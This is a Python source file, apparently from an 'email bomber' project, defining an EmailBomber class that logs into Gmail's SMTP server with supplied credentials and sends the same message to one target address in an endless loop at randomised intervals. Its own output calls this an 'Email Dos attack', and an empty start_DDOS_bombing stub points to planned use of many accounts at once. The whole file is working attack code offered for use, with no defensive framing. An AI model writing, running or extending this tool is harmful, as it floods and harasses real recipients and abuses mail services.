import smtplib
from time import sleep
from datetime import datetime
import random

from src.Bomber import Bomber


class EmailBomber(Bomber):
	def __init__(self, receiver_email: str, msg: str, min_interval=600, max_interval=600):
		self.receiver_email = receiver_email
		self.msg = msg
		self.min_interval = min_interval
		self.max_interval = max_interval
		self.server = None

	def start_bombing(self, sender_email: str, sender_email_password: str):
		self.server = smtplib.SMTP('smtp.gmail.com', 587)
		self.server.starttls()
		self.server.login(sender_email, sender_email_password)

		try:
			self.send(sender_email)
		finally:
			self.server.quit()

	def start_DDOS_bombing(self, email_and_passwords: list):
		pass

	def send(self, sender_email: str):
		print("Press Ctrl + c to stop.")
		while True:
			try:
				self.server.sendmail(
					sender_email,
					self.receiver_email,
					self.msg
				)
				time = datetime.now()
				print(
					f"{sender_email} -> {self.receiver_email}  {time.day}.{time.month}.{time.year} {time.hour}:{time.minute}:{time.second}")

				random_time = random.randint(self.min_interval, self.max_interval)
				sleep(random_time)
			except KeyboardInterrupt:
				print("Email Dos attack stopped!")
				break